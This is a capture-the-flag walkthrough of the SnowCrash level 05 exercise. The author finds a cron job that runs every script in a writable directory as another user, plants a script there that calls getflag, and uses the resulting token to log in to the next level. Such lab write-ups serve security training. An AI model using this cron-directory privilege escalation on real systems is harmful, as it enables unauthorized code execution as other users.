# Level 05

## Description

Let's explore :

```
level05@SnowCrash:~$ ls
level05@SnowCrash:~$ 
```

Nothing there... let's try to find files (starting from our root) that the "flag05" account has the rights to execute :

```
level05@SnowCrash:~$ find / -user flag05
```

It gives us a long list, most of the files are marked as "Permission denied", except 2 :

```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Let's try to see what's inside :

```
level05@SnowCrash:~$ ./usr/sbin/openarenaserver
bash: ./usr/sbin/openarenaserver: No such file or directory
```

Nothing there...

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Hmmm, interesting... so this is a shell script that loops over every file (*) inside the directory "/opt/openarenaserver/" and executes each file it finds there, and then it deletes the file (and the loop continues)...

This runs in a subshell (bcause of the parentheses).

```
ulimit -t 5 = Limits CPU time to 5 seconds for processes started in this subshell (if the script uses more than 5 CPU seconds, the kernel will terminate it)
bash -x "$i" = Executes the file as a Bash script. -x enables tracing, so every command executed is printed to stderr.
```

Ok, but what's inside "/opt/openarenaserver/" ?

```
level05@SnowCrash:~$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ ls -a

level05@SnowCrash:/opt$ ls -lRa
.:
total 0
drwxr-xr-x  1 root root  60 Apr 21 13:12 .
drwxr-xr-x  1 root root 240 Apr 21 13:12 ..
drwxrwxr-x+ 2 root root  40 Apr 21 13:12 openarenaserver
```

Nothing... ok... but at least this directory is writable, so if I put something in there, this can be executed with the rights of the person/thing that executes it, so maybe there is something else in the system that runs this script instead of myself ? Like another user ? Or a cron job ? Or a daemon process ? Let's check :

```
level05@SnowCrash:~$ ps aux | grep openarenaserver
level05   2697  0.0  0.0   4380   824 pts/0    S+   14:53   0:00 grep --color=auto openarenaserver
```

Nothing... Let's try searching for other things too... Let's try to find all the files in my filesystem whose name is exactly "level05" = filename-based search :

```
find / -name level05
```

So, this gives me a long list with 2 interesting results too (with the corrcet permissions) :

```
/var/mail/level05
/rofs/var/mail/level05
```

So, there are 2 files named "level05" in my system... Let's try to see what's inside them :

Let's try to execute them :

```
level05@SnowCrash:~$ /var/mail/level05
bash: /var/mail/level05: Permission denied
level05@SnowCrash:~$ /rofs/var/mail/level05
bash: /rofs/var/mail/level05: Permission denied
```

No permissions... Let's try to "cat" them :

```
level05@SnowCrash:~$ cat /rofs/var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Hmmm... so these 2 files contain cron job definitions (it's the same cron job in the 2 files)... this runs the script "/usr/sbin/openarenaserver" every 2 minutes as user "flag05".

And remember, the script "/usr/sbin/openarenaserver" executes everything inside the directory "/opt/openarenaserver/"...

We can therefore create a script that runs the "/bin/getflag" and if we put it inside the directory "/opt/openarenaserver/" we know that this script will be run as user "flag05" so the flag will be printed... BUT :

Let's for example test a simple script first, if we go to this directory :

```
level05@SnowCrash:~$ cd /opt/openarenaserver/
```

And create a script file named "script" that prints a simple "hello" when it runs :

```bash
echo "echo hello" > script
```

I know this script will be deleted once it executes, and I also know that this will be executed as "flag05" BUT "cron" will run it in the background (not in your terminal)

So, I will never see the "hello" on my screen, but the output of this execution (the "hello") will be printed to the stdout of that background cron process, UNLESS I REDIRECT IT ELSEWHERE...

So, I need :

- one file/script inside "/opt/openarenaserver/" that will contain the command "echo hello"
- another command to redirect the output of that command execution to a new file somewhere else (but NOT inside the "/opt/openarenaserver/", because it gets deleted every 2 minutes)

= BUT I can (and here I need to) combine these 2 things in 1 compound command inside the script : just write "echo hello > /tmp/my_text", so :

Let's go to this directory :

```
level05@SnowCrash:~$ cd /opt/openarenaserver/
```

Let's create a file here, that will execute "echo hello" on bash and then redirect the output on another file ("my_text") inside another folder (like "/tmp") :

```
level05@SnowCrash:/opt/openarenaserver$ echo "echo hello > /tmp/my_text" > script
```

= so actually my script will execute this 1 command : "echo hello > /tmp/my_text" when the cron job launches it (as flag05).

So, I need to wait for 2 minutes, for the cron job to run my script and then, if I go to "/tmp" and do "cat" to "my_text", I will see the "hello" output the "echo hello" part of my command :

```
level05@SnowCrash:/opt/openarenaserver$ cd /tmp
level05@SnowCrash:/tmp$ cat my_text
hello
```

So, now we can replace the command "echo hello" with something more interesting like "/bin/getflag" :

```
level05@SnowCrash:/opt/openarenaserver$ echo "/bin/getflag > /tmp/my_flag" > script
```

We wait for 2 minutes, and then we check the "/tmp/my_flag" file :

```
level05@SnowCrash:/opt/openarenaserver$ cd /tmp
level05@SnowCrash:/tmp$ cat my_flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Ok, let's use it :

```
level05@SnowCrash:/tmp$ su level06
Password: viuaaale9huek52boumoomioc

level06@SnowCrash:~$ 
```
